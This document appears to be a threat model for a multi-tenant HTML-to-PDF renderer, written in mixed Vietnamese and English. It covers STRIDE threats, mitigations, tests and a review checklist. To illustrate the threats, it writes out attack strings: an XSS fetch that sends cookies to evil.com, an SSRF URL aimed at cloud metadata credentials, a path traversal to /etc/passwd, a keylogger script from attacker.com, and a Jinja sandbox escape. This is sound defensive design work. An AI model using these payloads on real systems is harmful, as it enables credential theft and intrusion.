# Feature — Threat Model (PDF HTML Renderer)

**Stage 2** · linked to `spec.md`. STRIDE per attack vector + regression risks for the libreoffice-based DOCX→PDF pipeline being kept in parallel.

Severity scale: **C**ritical · **H**igh · **M**edium · **L**ow.

---

## A. STRIDE per attack vector

### R1 — Cross-tenant leak via shared browser context (I, S) — **C**

- **Threat**: Renderer reuses 1 browser context cho nhiều requests across tenants. Tenant A render → cookie/storage/cache còn lại trong context → tenant B render request kế tiếp đọc được. Hoặc background fetch chưa drained → embed vào response B.
- **Mitigations**:
  1. **Mỗi request → `context.new_page()` mới** (không reuse page). Page closed + storage cleared sau render.
  2. Browser context shared (resource saving) NHƯNG `storage_state` không persist; cookies/localStorage không write từ template (template không có script tag tới origin có cookie).
  3. CSP header trong HTML rendered: `default-src 'none'; img-src 'self' data:; font-src 'self'; style-src 'self' 'unsafe-inline'` — chặn fetch ra ngoài.
  4. Renderer container network policy: chỉ cho phép `127.0.0.1` (template loads from local FS) — KHÔNG cho phép outbound network. R2 asset (logo) embed sẵn vào image hoặc bundle local trong `templates_html/_shared/`.
  5. Audit log mỗi render với `tenant_id` + browser_context_id để forensic nếu nghi ngờ leak.
- **Tests**: SEC-01..03 (render tenant A → render tenant B back-to-back trong cùng context, parse PDF B không chứa ID/data tenant A; verify network request log empty trong CDP trace; storage_state empty sau render).

### R2 — XSS / arbitrary JS execution via data injection (T, E) — **C**

- **Threat**: User company nhập `company_name = "<script>fetch('//evil.com/'+document.cookie)</script>"` vào form. Jinja2 inject raw → Chromium execute script → SSRF via `fetch()` to internal services (Vault, DB), hoặc exfil tenant data trong context.
- **Mitigations**:
  1. **Jinja2 `autoescape=True`** mặc định cho `.html` template. Mọi data field auto-escape `< > & " '`.
  2. Pydantic validate input trước render: `str` field có max_length, regex whitelist cho field cấu trúc (cert_number, phone, email).
  3. CSP `script-src 'none'` trong HTML output → ngay cả nếu escape sai, browser từ chối execute inline `<script>`.
  4. Browser launch flags: `--disable-features=IsolateOrigins,site-per-process` (thực ra giữ isolation), `--no-sandbox` **CẤM** trong prod (chỉ dùng trong test). Container đã isolated qua user namespace.
  5. Network policy chặn outbound (R1.4) — ngay cả nếu script execute, không exfil được.
- **Tests**: SEC-04..06 (XSS payload trong mỗi field của Pydantic schema → render thành công với entity-encoded text, không có execution; CSP violation logged; CDP network log không có outbound request).

### R3 — SSRF via external URL load (E, I) — **C**

- **Threat**: Designer commit template `<img src="{{ company_logo_url }}">` cho phép data binding URL. User company set `company_logo_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` (AWS metadata) → Chromium fetch → response embed vào PDF → exfil cloud creds. Tương tự với Vault `http://vault:8200/v1/secret/`.
- **Mitigations**:
  1. **Template policy**: `<img src>` chỉ được dùng `{{ asset('path/in/_shared/') }}` helper — KHÔNG nhận URL từ data. Helper resolve relative đến `templates_html/_shared/` trước render.
  2. Pydantic schema **không có URL field** — logo cố định trong template (1 logo aminra hoặc theo cfg admin hardcoded path). Multi-CB logo (Phase 2) sẽ resolve qua `cfg.cb_logo_id` → lookup local asset, không URL từ data.
  3. CSP `img-src 'self' data:` — chặn external image load ngay cả nếu URL escape qua.
  4. Container network policy block outbound metadata IPs (`169.254.0.0/16`) + private ranges (defense in depth).
  5. Linter trong pre-commit: grep template HTML cho pattern `src="{{` hoặc `href="{{` → fail nếu match (chỉ allow `src="{{ asset(...) }}"`).
- **Tests**: SEC-07..09 (Pydantic reject URL field; template render với data có URL string không tạo `<img src=URL>` (escaped); attempt CSP violation logged; pre-commit linter fail trên template raw URL).

### R4 — Path traversal via doc_type parameter (I) — **H**

- **Threat**: Attacker request `/api/templates/../../etc/passwd/render-pdf` → renderer load `templates_html/../../etc/passwd/v1/template.html` → Jinja2 render `/etc/passwd`.
- **Mitigations**:
  1. `doc_type` validated bằng whitelist regex `^[a-z][a-z0-9_]{1,40}$` ở route layer (Pydantic Path param).
  2. Lookup qua `_TEMPLATES_HTML_REGISTRY` dict (mirror DOCX registry) — nếu doc_type không có trong registry → 404, KHÔNG hit filesystem.
  3. Jinja2 environment với `FileSystemLoader(['templates_html'])` + `searchpath` không có `..` resolution (Jinja2 mặc định reject `../` paths).
- **Tests**: SEC-10..11 (`doc_type=../../etc` → 404 không 500; `doc_type=` empty → 400; `doc_type=halal_policy/../../secret` → 404).

### R5 — DoS browser pool exhaustion (D) — **H**

- **Threat**: Attacker (hoặc audit deadline spike từ brain Section 7 risk) flood `/render-pdf` → 3 contexts busy, queue grow → memory grow → backend OOM. Hoặc 1 single request có template với `<img src="/very/large/asset">` 100MB → render hang 30s blocking 1 context.
- **Mitigations**:
  1. **Rate limit** `Depends(rate_limit_pdf_render)` per-tenant: 10 req/min, burst 3 (reuse existing rate_limit pattern in `/ingest`).
  2. **Per-request timeout 30s** — `asyncio.wait_for` wrap renderer call. Sau timeout: cancel page, force close, return 408.
  3. **Pool semaphore size = POOL_SIZE (default 3)**, queue max = 10 requests. Quá → 503 Retry-After: 5.
  4. **Asset size limit**: 5MB per asset trong template (linter check bundle size pre-commit).
  5. **Health endpoint** `/render-pdf/health` cho monitoring; alert nếu `contexts_busy == pool_size` > 60s.
  6. **Graceful degradation**: nếu pool exhausted, fallback DOCX route (libreoffice still alive) → user vẫn nhận file, chỉ không phải PDF đẹp.
- **Tests**: PERF-01..03 (15 concurrent → first 3 success < 2s, 4-13 queued < 5s, 14-15 → 503; render với template 30s loop → 408; rate limit fire after 10/min).

### R6 — Information disclosure via PDF metadata (I) — **M**

- **Threat**: PDF metadata mặc định Chromium include creator string + creation date với millisecond timestamp + có thể system path. Cùng input → khác output bytes → cache miss + reveal infrastructure (Chrome version → vulnerability mapping).
- **Mitigations**:
  1. Sau `page.pdf()`, post-process bytes qua `pikepdf` / `pypdf` để strip metadata: `Producer`, `Creator`, `CreationDate`, `ModDate` → set thành deterministic giá trị (`Producer = "AMINRA Halal Cert Platform"`, `CreationDate = D:00010101000000Z`).
  2. ETag computed AFTER metadata strip — đảm bảo cùng input → cùng ETag.
- **Tests**: SEC-12 (render 2 lần cùng data → byte-identical PDF, same SHA-256; `pdfinfo` không show Chrome version).

### R7 — Audit log evasion (R) — **M**

- **Threat**: Render success nhưng audit_log row missing. Nếu regulator hỏi "ai render bản profile A ngày B" — không trace được.
- **Mitigations**:
  1. Audit log insert in **same transaction** với render trigger (write log BEFORE render bytes — ngay cả nếu render fail, log chứng minh attempt).
  2. Audit log table append-only (existing trigger từ migration 007).
  3. Helper `log_audit(...)` raise on failure, KHÔNG swallow.
  4. Per-doc_type smoke test: render → check audit row exists với đúng `actor_id`, `tenant_id`, `doc_type`, `byte_size`, `duration_ms`.
- **Tests**: INT-01..03 (happy path 1 row; render fail (timeout) vẫn 1 row với `status=failed`; transactional integrity test).

### R8 — `cfg_override` privilege escalation (E) — **H**

- **Threat**: Non-admin business owner POST với `cfg_override = { confidential_label: "TÀI LIỆU MẬT JAKIM" }` → fake official confidential branding trên PDF của tenant mình → đem đi lừa CB rằng đã được approve bởi JAKIM.
- **Mitigations**:
  1. Route layer: `cfg_override` field reject (400) nếu user không có role `platform_admin`.
  2. Audit log mọi cfg_override với value (admin action, traceable).
  3. PDF watermark "DRAFT — Tenant-rendered, not authoritative" cho mọi doc render bởi non-CB-issued flow → khác với cert PDF (reportlab) là "ISSUED BY CB".
- **Tests**: SEC-13..14 (business_owner POST cfg_override → 403; admin POST OK + audit row).

### R9 — Template supply chain compromise (T, E) — **M**

- **Threat**: Designer commit template với hidden `<script src="//attacker.com/keylog.js">` (CSP block runtime, NHƯNG CSP có thể bị designer accidentally remove). Hoặc CSS `@import url(//evil.com/malicious.css)`.
- **Mitigations**:
  1. **Pre-commit linter**: scan `templates_html/**/*.html` cho external URL pattern → block commit.
  2. **CI gate**: build PDF cho 1 fixture mỗi doc_type, parse output PDF với `pikepdf`, verify không có embedded script / external link.
  3. **Code review required** cho mọi PR đụng `templates_html/` (CODEOWNERS).
  4. CSP enforcement ở runtime (R1.3) — defense in depth.
  5. Snapshot test (visual regression) — designer commit → snapshot diff → reviewer thấy gì lạ.
- **Tests**: CI-01..02 (linter catch external URL; CI gate fail nếu PDF chứa external link annotation).

### R10 — Render-time resource exhaustion via template (D) — **M**

- **Threat**: Designer (hoặc accidental) commit template với `{% for i in range(1000000) %}{{ i }}{% endfor %}` → Jinja2 hang → block 1 context 30s → drain pool.
- **Mitigations**:
  1. **Jinja2 sandbox env** với `SandboxedEnvironment` — restrict access to `range`, `__class__`, dunder, etc.
  2. **Render budget**: Jinja2 render bytes limit 5MB; HTML > limit → 500.
  3. **Per-doc-type render timeout** (subset của R5.2 30s): Jinja2 step 5s → page render 25s.
- **Tests**: SEC-15..16 (template với big-loop → 500 timeout; sandbox prevent `__import__('os').system('id')`).

---

## B. Regression risk for existing libreoffice route

### RR1 — Path divergence khi feature flag rollout per-doc_type

- **Threat**: Frontend kiểm tra flag `pdf_html_renderer_v1.{doc_type}` để chọn endpoint. Nếu flag check sai → user click "Download PDF" → 404 vì doc_type chưa enable HTML route.
- **Severity**: **L** — UX issue, không security.
- **Mitigation**: Frontend fallback: nếu `/render-pdf` 404 → POST `/export-docx` rồi convert qua libreoffice → user vẫn được file, chỉ là DOCX cũ hoặc PDF từ libreoffice.

### RR2 — LibreOffice-based PDF preview routes (5 call sites) bị tưởng nhầm là target migrate

- **Threat**: Engineer tưởng "migrate PDF" = thay tất cả libreoffice → xóa nhầm `app.py:762` etc. → user upload DOCX không xem preview được.
- **Severity**: **M** — broken UX.
- **Mitigation**: spec.md §2 "Out of scope" liệt kê rõ 5 call sites này KHÔNG đụng. Reviewer check trong PR description.

### RR3 — Frontend giữ `docxtemplater@^3.50.0` không cần thiết sau migrate

- **Threat**: Tech debt — dependency tăng bundle size, supply chain attack surface không cần.
- **Severity**: **L**.
- **Mitigation**: Phase 5 (post-demo): remove `docxtemplater` từ frontend deps nếu DOCX flow chuyển hoàn toàn server-side.

---

## C. Security review checklist (Phase 5 manual)

Reviewer phải confirm trước khi merge:

- [ ] CSP header inject vào mọi rendered HTML, verify qua `curl ... | grep "default-src 'none'"`
- [ ] Container network policy (`docker-compose.yml`) chặn outbound từ backend container ngoại trừ cần thiết (DB, Redis, R2 — S3 endpoint, Vault). Test: `docker exec backend curl http://169.254.169.254/` → timeout.
- [ ] Pydantic schema mọi field có max_length + regex (không có free-form `str` không bound)
- [ ] Pre-commit hook + CI linter active cho `templates_html/`
- [ ] Audit log row mỗi render (verify trên staging với 5 render → 5 row)
- [ ] PDF metadata strip — `pdfinfo output.pdf` không show Chrome version
- [ ] Browser launch KHÔNG `--no-sandbox` trong prod (verify trong `pdf_renderer.py` không có flag này khi env != test)
- [ ] Rate limit fire khi spam (manual test 11 req/min/tenant → 429)

---

## D. References

- spec.md §2 (out of scope)
- spec.md §3 (RBAC)
- spec.md §4.3 (browser lifecycle — context isolation)
- Existing risk register: brain Section 7 — "Cross-tenant data leak", "Prompt injection qua tài liệu upload"
- Existing pattern: `auth/jwt_utils.py:require_business_owner` (RBAC), `services/rate_limiter.py` (rate limit)
